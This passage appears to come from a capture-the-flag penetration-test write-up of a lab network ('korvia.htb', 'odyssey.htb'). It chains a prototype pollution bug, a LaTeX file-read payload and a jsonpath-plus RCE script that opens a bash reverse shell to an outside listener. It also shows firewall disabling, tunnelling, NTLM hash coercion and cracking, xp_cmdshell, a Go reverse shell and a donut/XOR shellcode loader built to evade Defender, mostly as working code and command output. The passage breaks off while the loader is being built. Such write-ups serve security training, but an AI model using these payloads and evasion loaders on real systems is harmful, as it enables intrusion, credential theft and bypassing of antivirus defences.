Combining these pieces of information, we can assume that setting the `allowRawBlocks` property to `true` will enable the `raw_attribute extension`, which will be very beneficial for us, as will be explained later. We can set it to `true` directly in the overrides, but we will find that this does not enable the extension. This means that the `allowRawBlocks` property could be a prototype set to `false` by default, which is exactly the type of situation where we can try the prototype pollution exploit we designed earlier.

In the overrides section, we will replace the `allowRawBlocks` assignment with the following pollution attempt:

```json
"__proto__":{"allowRawBlocks":true}
```

Rendering with these overrides provides the result we expected:

```json
{
  "stage": "pandoc",
  "code": 0,
  "durationMs": 37,
  "cmd": "/usr/bin/pandoc --from markdown+raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/authcert.tex -o /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.tex /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.md",
  "stderr": "",
  "stdout": ""
}
```

The prefix has been changed to `+`, confirming the prototype pollution, and also enabling the raw blocks in `pandoc`, which means we can now embed raw `LaTeX` in the markdown body using ``` `...`{=latex} ```.  The obvious direct RCE vectors like `\write18{cmd}` won't work, since both `pdflatex` and `latex` are run with the `--no-shell-escape` flag. The same goes for `Ghostscript`, which is run with the `-dSAFER` flag.

The obvious path is to redirect our efforts to reading files from the local system. The most common `latex` method to read files is `\input`, so we will try to read the `/etc/passwd` file to confirm that raw blocks actually work. In the template body, we are going to append:

```markdown
`\input{/etc/passwd}`{=latex}
```

![](Odyssey.assets/web_app_14.png)

We have verified that we can read files through this oracle. The output of the `passwd` file is mangled, but still readable. The next logical step is to enumerate the contents of the `/proc/self/cgroup` file, because if we retrieve the name of the service running the application, we can locate the webroot and start reading the application's backend code. 

But when we try to do so, we find out that there is no observable output. The file's content is lost between font selector prefixes like `\OML/lmm/m/it/10`, long lines are re-broken by overfull-hbox logic, and characters like `/` sometimes appear like `=`. This is because `\input` typesets the file; `TeX's` typesetting engine interprets every character through its catcode table, font engine, and paragraph builder.

Searching for `latex read file without typesetting` and similar searches, we come across articles that will help us retrieve the output cleanly. Specifically, [this](https://checkoway.net/papers/tex2010/tex2010.pdf) seminal academic paper from Checkoway & Shacham demonstrates that `TeX` has file I/O primitives (`\openin`, `\read`, `\write`, `\closein`, `\closeout`) that operate below the typesetting layer. The key insight here is that `\read\handle` to `\macro` stores a line of text into a macro without expansion or typesetting. The data is just a string - no catcode interpretation, no font switching, no paragraph building.

Two other useful resources are [this](https://latexref.xyz) unofficial reference, which documents the primitives in their `plain-TeX/LaTeX2e` form, and [this](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/#summary) `PayloadAllTheThings` page, which demonstrates some read file operations. Combining all these pieces together, we create the following payload to be able to read files in their original form.

```latex
`\newread\foo \openin\foo=<TARGET_FILE> \loop\unless\ifeof\foo \read\foo to \line \message{^^J<<<\meaning\line>>>^^J}\repeat \closein\foo
```

- `\newread\foo` creates a new input stream named `foo`. 
- `\openin\foo` opens the target file for reading using the stream `\foo`. 
- `\loop` starts a `TeX` loop, and `\unless\ifeof\foo` continues looping unless the file stream has reached EOF. 
- `\read\foo to \line` reads one line from the file handle `\foo` and stores it in the macro `\line`. 
- `\message{^^J<<<\meaning\line>>>^^J}` writes text into the `TeX` log/output stream. `^^J` is the newline character, and `<<<` is the literal marker, useful to find the output in the logs. `\meaning\line` prints `TeX's` representation of the macro `\line`. This will look like `macro:-> file contents here`. Using `\meaning` is useful because it prints the contents without trying to execute them as `TeX` commands. 
- `\repeat` ends the loop body and jumps back to `\loop` while the condition is true. 
- Finally, `\closein\foo` closes the input stream. 

Using this payload, we can successfully retrieve the contents of `/proc/self/cgroup`.

![](Odyssey.assets/web_app_15.png)

The service name is `aegis.service`. We will proceed to read `/etc/systemd/system/aegis.service` to identify the webroot.

![](Odyssey.assets/web_app_16.png)

The application runs in `/home/webadmin/aegis`. Let's enumerate the `server.js` file.

![](Odyssey.assets/web_app_17.png)

Let's unmangle the output from the macro tags.

```javascript
const path = require('path');
const express = require('express');
const session = require('express-session');
const nunjucks = require('nunjucks');

const mongo = require('./db/mongo');
const sql = require('./db/sql');
const MssqlSessionStore = require('./lib/sql_session_store');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

app.set('trust proxy', 1);

const env = nunjucks.configure(path.join(__dirname, 'views'), {
  autoescape: true,
  express: app,
  noCache: true,
});

env.addGlobal(
  'CLASSIFICATION',
  'TOP SECRET // KORVIA EYES ONLY // D9-RESTRICTED'
);

env.addGlobal('SYSTEM', {
  name: 'AEGIS',
  longName: 'Sovereign Signing & Attestation Authority',
  agency: 'Directorate 9',
  build: '7.4.2-prod',
  node: 'aegis-prod-01',
});

const AEGIS_HOST = 'aegis.korvia.htb';

app.use((req, res, next) => {
  const host = (req.headers.host || '').replace(/:.*/, '');

  if (host !== AEGIS_HOST) {
    return res.redirect(
      301,
      'http://' + AEGIS_HOST + ':' + PORT + req.originalUrl
    );
  }

  next();
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(
  session({
    name: 'aegis.sid',
    secret:
      process.env.AEGIS_SESSION_SECRET ||
      'aegis-prod-fixed-secret-d9-restricted-do-not-rotate',
    store: new MssqlSessionStore({
      ttlMs: 30 * 24 * 60 * 60 * 1000,
    }),
    resave: false,
    saveUninitialized: false,
    rolling: true,
    cookie: {
      httpOnly: true,
      sameSite: 'lax',
      maxAge: 30 * 24 * 60 * 60 * 1000,
    },
  })
);

app.use((req, res, next) => {
  res.locals.path = req.path;

  if (req.session && req.session.userId) {
    res.locals.user = {
      id: req.session.userId,
      handle: req.session.userHandle,
      role: req.session.userRole,
    };
  } else {
    res.locals.user = null;
  }

  next();
});

app.use('/', require('./routes/mds'));
app.use('/', require('./routes/mds_diag'));
app.use('/', require('./routes/onboard'));
app.use('/', require('./routes/webauthn'));
app.use('/', require('./routes/templates'));
app.use('/', require('./routes/index'));

app.use((req, res) => {
  res.status(404).render('error.njk', {
    code: 404,
    title: 'Resource Not Located',
    detail: 'The requested object does not exist or your clearance is insufficient.',
  });
});

async function waitForDeps() {
  // Mongo: hard requirement, retry forever in 5s steps
  // mongod is local, should come up fast
  for (;;) {
    try {
      await mongo.init();
      console.log('MDS shard connected.');
      break;
    } catch (e) {
      console.error('MDS shard unreachable, retrying in 5s:', e.message);
      await new Promise((r) => setTimeout(r, 5000));
    }
  }

  // SQL: retry forever in 5s steps until pool is ready
  for (;;) {
    try {
      await sql.init();
      console.log('AEGIS SQL connected.');
      break;
    } catch (e) {
      console.error('AEGIS SQL unreachable, retrying in 5s:', e.message);
      await new Promise((r) => setTimeout(r, 5000));
    }
  }
}

(async () => {
  await waitForDeps();

  app.listen(PORT, HOST, () => {
    console.log(`AEGIS listening on http://${HOST}:${PORT}`);
  });
})();
```

We see various bits of information here. One bit that stands out is the route to `mds_diag`, an endpoint we have not encountered yet. Let's retrieve the source code from `/home/webadmin/aegis/routes/mds_diag.js` using our file-read sink. After unmangling the output again:

```javascript
'use strict';

const express = require('express');
const router = express.Router();
const { JSONPath } = require('jsonpath-plus');

const sql = require('../db/sql');
const { getDb } = require('../db/mongo');
const profiles = require('../lib/mds_diag_profiles');

const TOKEN = process.env.MDS_DIAG_TOKEN || '';

if (!TOKEN) {
  console.warn(
    '[mds-diag] no token loaded; populate /etc/aegis-mds-diag.env to set MDS_DIAG_TOKEN'
  );
}

<SNIP>
router.post(
  '/api/v1/aegis-mds/_diag/:token/jpquery',
  express.json({ limit: '32kb' }),
  async (req, res) => {
    if (!TOKEN || req.params.token !== TOKEN) {
      return res.status(404).render('error.njk', {
        code: 404,
        title: 'Resource Not Located',
        detail:
          'The requested object does not exist or your clearance is insufficient.',
      });
    }

    const body = req.body || {};
    const expr = body.expr;
    const context =
      typeof body.context === 'string' ? body.context : 'registration';

    const err = preflight(expr);
    
<SNIP>
    const DEFAULT_JP_OPTS = {
      eval: 'safe',
      wrap: false,
      flatten: false,
      resultType: 'value',
      preventEval: false,
    };

    const opts = Object.assign({}, DEFAULT_JP_OPTS, profile.jpOpts, {
      path: expr,
      json: snapshot,
    });

    let matches = [];
    let status = 'ok';
    let errorDetail = null;

    try {
      matches = JSONPath(opts);

      if (!Array.isArray(matches)) {
        matches = matches === undefined ? [] : [matches];
      }
    } catch (e) {
      status = 'error';
      errorDetail = e && e.message ? e.message : String(e);
    }
<SNIP>
```

Two critical pieces of information are here: There is an endpoint that accepts a `jQuery` request, which requires a token found in `/etc/aegis-mds-diag.env` to access. The second is that it uses `JSONPath` with `eval: safe`. 

We will first enumerate the token from the identified file, and also try to see if there is a `packages.json` file that might help us identify the version of `JSONPath`.

`/etc/aegis-mds-diag.env`:

```shell
MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
```

`/home/webadmin/aegis/package.json`:

```json
{
  "name": "aegis",
  "version": "0.1.0",
  "private": true,
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "node --watch server.js"
  },
  "dependencies": {
    "@simplewebauthn/server": "^10.0.1",
    "express": "^4.21.0",
    "express-session": "^1.19.0",
    "jsonpath-plus": "^10.2.0",
    "mongodb": "^7.2.0",
    "mssql": "^12.5.0",
    "nunjucks": "^3.2.4"
  }
}
```

Searching for CVEs related to the specified version of `jsonpath-plus`, we find [this](https://github.com/EQSTLab/CVE-2025-1302) PoC, which explains how we can achieve RCE due to this version's unsafe default usage of `eval: safe`. We will modify the script a bit to make it simpler, and fire our payload against the endpoint with the token, to achieve local access as the user `webadmin`.

```python
# CVE_2025_1302.py
import requests, base64

DIAG_TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"
URL   = f"http://aegis.korvia.htb:3000/api/v1/aegis-mds/_diag/{DIAG_TOKEN}/jpquery"
LHOST = "10.10.14.10"
LPORT = 4444

cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()
inner = (
    f"this.process.mainModule.require('child_process')"
    f".exec('echo {b64}|base64 -d|bash')"
)
expr = (
    f"$..[?(p=\"{inner}\";"
    f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
)
r = requests.post(URL, json={"context":"registration","expr":expr}, timeout=5)
```

```shell
$ python3 CVE_2025_1302.py

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.141] 52770
webadmin@odyssey-web:~/aegis$ id
id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),983(aegis-render)
```

# Lateral Movement - Access to Odyssey-DB

## Password Reuse to root and Initial Enumeration

During manual enumeration of the application's files, we encounter multiple credentials. One such file is `/home/webadmin/aegis/db/sql.js`, which establishes a DB connection to `172.16.0.11`.

```shell
webadmin@odyssey-web:~/aegis$ cat db/sql.js
const sql = require('mssql');

const config = {
	user: process.env.AEGIS_SQL_USER || 'odyssey_app',
  password: process.env.AEGIS_SQL_PASS || 'opc0932k90%%lODFI93-++',
  server: process.env.AEGIS_SQL_HOST || '172.16.0.11',
  database: process.env.AEGIS_SQL_DB || 'aegis',
  port: parseInt(process.env.AEGIS_SQL_PORT || '1433', 10), 
```

We saw earlier that the `webadmin` user is in the `sudo` group. We will try this password to check if we can elevate to root.

```shell
webadmin@odyssey-web:~/aegis$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
webadmin@odyssey-web:~/aegis$ ^Z
zsh: suspended  nc -lvnp 4444                                                        
$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm-256color
webadmin@odyssey-web:~/aegis$ sudo su
[sudo: authenticate] Password:                       
root@odyssey-web:/home/webadmin/aegis# id
uid=0(root) gid=0(root) groups=0(root)
root@odyssey-web:/home/webadmin/aegis# 
```

We can see that `SSH` is running on the server.

```shell
root@odyssey-web:/home/webadmin/aegis# systemctl status ssh                                                   
● ssh.service - OpenBSD Secure Shell server
		Loaded: loaded (/usr/lib/systemd/system/ssh.service; disabled; preset: ena>
     Active: active (running) since Wed 2026-05-13 14:23:40 UTC; 5h 10min ago
```

That means that it was probably disallowed through firewall rules earlier. We will disable `UFW` completely to eliminate any networking issues while keeping port `22` accessible. This will allow us to connect through `SSH` for smoother interaction and persistence.

```shell
root@odyssey-web:/home/webadmin/aegis# ufw disable
Firewall stopped and disabled on system startup
```

```shell
$ ssh webadmin@aegis.korvia.htb                  
webadmin@aegis.korvia.htb's password:

webadmin@odyssey-web:~$ sudo su
[sudo: authenticate] Password:                       
root@odyssey-web:/home/webadmin# 
```

By running `ifconfig` and reading `/etc/hosts`, we find out that there is an internal `172.16.0.0/24` network, to which `odyssey-web` also belongs.

```shell
root@odyssey-web:/home/webadmin# ifconfig
<SNIP>
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.0.12  netmask 255.255.255.0  broadcast 172.16.0.255
        inet6 fe80::215:5dff:fe01:4202  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:01:42:02  txqueuelen 1000  (Ethernet)
        RX packets 7257  bytes 966494 (966.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5585  bytes 1031714 (1.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@odyssey-web:/home/webadmin# cat /etc/hosts
<SNIP>
# AEGIS internal lab — fallback if DC DNS is unreachable
172.16.0.10 dc01.odyssey.htb dc01
172.16.0.11 odyssey-db.odyssey.htb odyssey-db
```

The host we have compromised, `odyssey-web`, is at `172.16.0.12`. The other two servers are part of a Windows Domain, with the Domain Controller hosted at `172.16.0.10` as `dc01.odyssey.htb` and a database server hosted at `172.16.0.11` as `odyssey-db.odyssey.htb`. It should be noted that `odyssey-db` is the server that hosts the database for the `node.js` application we exploited earlier.

Since we want seamless access to this network, we will set up a tunnel through `ligolo-ng`. We will follow the standard procedure, which is highly documented.

```shell
LOCAL:
sudo ip tuntap add user rogue mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert

TARGET:
(download the agent)
chmod +x agent64
./agentx64 -connect 192.168.1.94:11601 -ignore-cert

LOCAL:
sudo ip route add 172.16.0.0/24 dev ligolo

IN LIGOLO:
session (select the session)
start

$ ping 172.16.0.11         
PING 172.16.0.11 (172.16.0.11) 56(84) bytes of data.
64 bytes from 172.16.0.11: icmp_seq=1 ttl=64 time=31.0 ms
64 bytes from 172.16.0.11: icmp_seq=2 ttl=64 time=19.0 ms
```

We will also add the hosts in our `/etc/hosts` file in the same format as we found them in `odyssey-web`. In addition, we will run two `nmap` scans against the targets to verify which services are available.

```shell
$ nmap -p- odyssey-db.odyssey.htb -sV -sC                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-14 04:27 WAT
Nmap scan report for odyssey-db.odyssey.htb (172.16.0.11)
Host is up (0.000064s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   172.16.0.11:1433: 
|     Target_Name: ODYSSEY
|     NetBIOS_Domain_Name: ODYSSEY
|     NetBIOS_Computer_Name: ODYSSEY-DB
|     DNS_Domain_Name: odyssey.htb
|     DNS_Computer_Name: odyssey-db.odyssey.htb
|     DNS_Tree_Name: odyssey.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2026-05-13T20:36:26+00:00; -7h01m23s from scanner time.
| ms-sql-info: 
|   172.16.0.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-12T18:00:02
|_Not valid after:  2056-05-12T18:00:02
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

`odyssey-db` has port `1433` open, which hosts the `MSSQL` server, and port `5985` which corresponds to `winrm`.

## BULK INSERT query Coersion

Now that we have everything set up properly for our convenience, we can continue with further enumeration. Looking back at the application's files, we can find a reference to another `env` file, in `/home/webadmin/aegis/lib/render_worker.js`.

```shell
root@odyssey-web:/home/webadmin/aegis/lib# cat render_worker.js | head -n 10
// AEGIS notice render worker.
// Invoked via sudo as the `aegis-render` system user. Reads a job spec from
// disk, runs the render pipeline, writes a diagnostics row, and exits.
//
// CLI: node render_worker.js <job_dir>
// The job_dir must contain a `job.json` file with the render request.
// The worker writes `result.json` next to it on completion.
//
// Per ICR-2024-0142 — render isolation. Worker runs as a dedicated principal
// with read access to /etc/aegis-render.env (audit-publisher MSSQL creds).
```

```shell
root@odyssey-web:/home/webadmin/aegis/lib# cat /etc/aegis-render.env
# AEGIS Notice Renderer service environment
# Provisioned per ICR-2024-0142 (render isolation) and Sov-Sec-19 (signing-side hardening).
# Audit-publisher principal: elevated rights for writing render attestations.
AEGIS_RENDER_DB_USER=aegis_audit_publisher
AEGIS_RENDER_DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
AEGIS_RENDER_DB_HOST=172.16.0.11
AEGIS_RENDER_DB_DB=aegis_audit
AEGIS_RENDER_DB_PORT=1433
AEGIS_RENDER_TMP=/var/lib/aegis-render/jobs
AEGIS_RENDER_OUT=/var/lib/aegis-render/out
AEGIS_RENDER_PANDOC=/usr/bin/pandoc
AEGIS_RENDER_GS=/usr/bin/gs
AEGIS_RENDER_TIMEOUT_MS=20000
root@odyssey-web:/home/webadmin/aegis/lib# 
```

This file contains another set of credentials. Let's try using them to authenticate to the `MSSQL` server.

```shell
$ impacket-mssqlclient 'aegis_audit_publisher:Rxd!Qw6n8sP..2bJ@Wpx-2026@odyssey-db' -p 1433        
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: aegis_audit
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(odyssey-db): Line 1: Changed database context to 'aegis_audit'.
[*] INFO(odyssey-db): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> 

SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin
is_sysadmin   
-----------   
          0   
```

The database user is not a `sysadmin`, which will enable us to use multiple paths to achieve code execution. Reading [Microsoft's Documentation](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17) on user roles in `MSSQL`, we identify the `bulkadmin` role, which Microsoft explains can escalate privileges under certain conditions. It also states that the `bulkadmin` role provides access to the `BULK INSERT` statement. Reading the [docs,](https://learn.microsoft.com/en-us/sql/t-sql/statements/bulk-insert-transact-sql?view=sql-server-ver17) we see that we can use `UNC` paths via the data source parameter. This can be a coercion path for us, if we can make the `MSSQL` service authenticate to a "path" we control. Relaying is not possible on Server 2025, as it rejects `NTLM` tokens regardless of EPA/MIC settings. But we can still try to crack the hash if we receive it.

We will first start `Responder`.

```shell
$ sudo responder -I eth0                                                                  
<SNIP>
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
<SNIP>
```

Then, we will construct an `SQL` query payload according to the documentation cited above. Before we do that, we will set up a listener on port `445` through our `ligolo-ng` tunnel, so that the authentication can pass through.

```shell
IN LIGOLO:
[Agent : root@odyssey-web] » listener_add --tcp --to 192.168.1.94:445 --addr 0.0.0.0:445

IN IMPACKET-MSSQLCLIENT:
SQL (aegis_audit_publisher  aegis_audit_publisher@aegis_audit)> EXEC ('BULK INSERT aegis_audit.dbo.audit_ingest_staging FROM ''\\172.16.0.12\x\test'' WITH (DATAFILETYPE = ''char'')');   
ERROR(odyssey-db): Line 1: Cannot bulk load because the file "\\172.16.0.12\x\test" could not be opened. Operating system error code 5(Access is denied.).
```

After the query is executed, we receive the `NTLMv2` hash of the `svc-mssql` account in `Responder`.

```shell
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.1.94
[SMB] NTLMv2-SSP Username : ODYSSEY\svc-mssql
[SMB] NTLMv2-SSP Hash     : svc-mssql::ODYSSEY:c7e7ac44de17f2c8:CE909057E6C0127960F1CD3DC3C80C0C:010100000000000000C2FCDD5FE3DC01AB183309518EB598000000000200080050004B004300590001001E00570049004E002D00340053005A005300450035004F0054005A003500580004003400570049004E002D00340053005A005300450035004F0054005A00350058002E0050004B00430059002E004C004F00430041004C000300140050004B00430059002E004C004F00430041004C000500140050004B00430059002E004C004F00430041004C000700080000C2FCDD5FE3DC0106000400020000000800500050000000000000000000000000300000F888EE49BA51133A0BD3EA3C89C52A3A806160B14718604E4EA8D1E7F2957E5F38322003336C120C946DA95D6DAAB7E228F610EB840BF3200E7F212527B065F30A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0030002E00310032000000000000000000
```

We will save the hash to a file and attempt to crack it with `hashcat`.

```shell
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
<SNIP>
SVC-MSSQL::ODYSSEY:c7e7ac44de17f2c8:ce909<SNIP>3002f003100370032002e00310036002e0030002e00310032000000000000000000:cml958782
                                                           
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
<SNIP>
```

We now have the `svc-mssql` password.

## Access as SYSTEM at Odyssey-DB

We now have a domain user. We can perform a `bloodhound` data collection request to get a general idea of what we are working with.

```shell
$ bloodhound-ce-python -u 'svc-mssql' -p 'cml958782' -d odyssey.htb --zip -c All -dc dc01.odyssey.htb -ns 172.16.0.10 -op test_bloodhound.zip -c All
```

We will upload the data to our `bloodhound` server, and we will keep it handy to enumerate further as we acquire more accounts. For now, `svc-mssql` does not seem to have any interesting properties on any domain object.

We can now log in to the `MSSQL` server as the `svc-mssql` user.

```shell
$ impacket-mssqlclient 'ODYSSEY/svc-mssql:cml958782@172.16.0.11' -p 1433 -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Press help for extra shell commands
SQL (ODYSSEY\svc-mssql  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin
is_sysadmin   
-----------   
          1
```

We are now `sysadmin`. This means we can enable `xp_cmdshell` and run commands through the `MSSQL` server.

```shell
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
INFO(odyssey-db): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
INFO(odyssey-db): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'whoami';
output              
-----------------   
odyssey\svc-mssql   
NULL     

SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'whoami /priv';
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have `SeImpersonatePrivilege`, so we know we can use one of the multiple `Potato` exploits to gain access as `SYSTEM` on `odyssey-db`. If we try to download and execute malicious binaries directly, we get no output, and the files are being deleted. This indicates that `Defender` is enabled on the target, and we need to perform some kind of evasion to make it work. For this writeup, we will follow this method:

First, we will write a standard reverse shell in `Go`.

```go
package main

import (
    "bufio"
    "net"
    "os/exec"
    "strings"
)

func main() {
    conn, err := net.Dial("tcp", "172.16.0.12:4444")
    if err != nil {
        return
    }
    defer conn.Close()
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        cmd := exec.Command("cmd.exe", "/c", strings.TrimSpace(scanner.Text()))
        out, _ := cmd.CombinedOutput()
        conn.Write(out)
        conn.Write([]byte("PS C:\\> "))
    }
}
```

The reason we chose `Go` is that the AMSI of Defender has deep hooks into `PowerShell` and `.NET`. `Go` compiles to a native PE binary - no `.NET`, no `PowerShell` engine, no AMSI instrumentation point. We then compile our reverse shell as an executable.

```shell
GOOS=windows GOARCH=amd64 go build -o s.exe -ldflags "-s -w" gorevshell.go
```

We then create a three-stage pipeline loader: `donut` -> `XOR Encrypt` -> `Go` shellcode runner in `Python`.

First, we need `donut` to have [GodPotato](https://github.com/BeichenDream/GodPotato) run in-memory. The output of [donut](https://github.com/thewover/donut) is raw `x86-x64` shellcode with no PE headers, no import table, and no sections. This will mitigate most of Defender's static scanner detection techniques.

```python
import donut

shellcode = donut.create(
    file="GodPotato.exe",
    params=r'-cmd C:\Users\Public\s.exe'
)
```

Using `params`, we embed `GodPotato's` command-line argument directly into the shellcode blob, which then runs the reverse shell payload we created earlier.

Even though `donut` removes PE structure, Defender also does byte-pattern matching on known shellcode stubs. `Donut's` CLR bootstrap stub has a recognizable prologue. For this reason, we will use `XOR` encryption to destroy static patterns. With a new key generated in each build, every compilation produces a completely different ciphertext - defeating signature databases entirely.

```python
import secrets

key = secrets.token_bytes(32)
encrypted = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

def to_go_bytes(data, name):
    lines = [f"var {name} = []byte{{"]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append("\t" + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    lines.append("}")
    return "\n".join(lines)
```

Now, we are going to create the `Go` loader. The first thing the loader does is reverse the XOR-encrypted data in memory.

```python
go_code = f'''package main

import (
\t"syscall"
\t"unsafe"
)

{to_go_bytes(key, "key")}
{to_go_bytes(encrypted, "enc")}

func main() {{
\tsc := make([]byte, len(enc))
\tfor i := range enc {{
\t\tsc[i] = enc[i] ^ key[i%len(key)]
\t}}
```

The initial page is `RW`, not `RWX`. This is a deliberate decision - allocating `PAGE_EXECUTE_READWRITE` in one shot is a well-known heuristic trigger. Defender flags any `VirtualAlloc(RWX)` call as suspicious.

```python
\tkernel32 := syscall.NewLazyDLL("kernel32.dll")
\tvAlloc := kernel32.NewProc("VirtualAlloc")
\taddr, _, _ := vAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
```

Then we will use `unsafe.Pointer` to copy the decrypted shellcode byte-to-byte into the allocated `RW` region. This is the equivalent of `memcpy`, but done manually to avoid importing `C` or calling `RtlCopyMemory`.

```python
\tfor i, b := range sc {{
\t\t*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
\t}}
```

Now:

```python
\tvar old uint32
\tvProt := kernel32.NewProc("VirtualProtect")
\tvProt.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))
```

This is the `RW` -> `RX` flip. Write to the page while it is writeable, then make it executable and remove the write permission. The page is never simultaneously writeable and executable. This avoids heuristics that flag `W+X` pages.

Finally, we will add a standard `CreateThread` block to run the shellcode written in memory.

```python
\tcreateThread := kernel32.NewProc("CreateThread")
\twaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
\tthread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
\twaitForSingleObject.Call(thread, 0xFFFFFFFF)
}}
```

The full loader generator script:

```python
# loader.py
import donut
import secrets

shellcode = donut.create(
    file="GodPotato.exe",
    params=r'-cmd C:\Users\Public\s.exe'
)

key = secrets.token_bytes(32)
encrypted = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])

def to_go_bytes(data, name):
    lines = [f"var {name} = []byte{{"]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append("\t" + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
    lines.append("}")
    return "\n".join(lines)

go_code = f'''package main

import (
\t"syscall"
\t"unsafe"
)

{to_go_bytes(key, "key")}

{to_go_bytes(encrypted, "enc")}

func main() {{
\tsc := make([]byte, len(enc))
\tfor i := range enc {{
\t\tsc[i] = enc[i] ^ key[i%len(key)]
\t}}
\tkernel32 := syscall.NewLazyDLL("kernel32.dll")
\tvAlloc := kernel32.NewProc("VirtualAlloc")
\taddr, _, _ := vAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
\tfor i, b := range sc {{
\t\t*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
\t}}
\tvar old uint32
\tvProt := kernel32.NewProc("VirtualProtect")
\tvProt.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))
\tcreateThread := kernel32.NewProc("CreateThread")
\twaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
\tthread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
\twaitForSingleObject.Call(thread, 0xFFFFFFFF)
}}
'''

with open("loader.go", "w") as f:
    f.write(go_code)
print(f"Generated loader.go ({len(shellcode)} bytes shellcode)")
```

We then run the loader generation script and compile the loader.

```shell
$ python3 loader.py
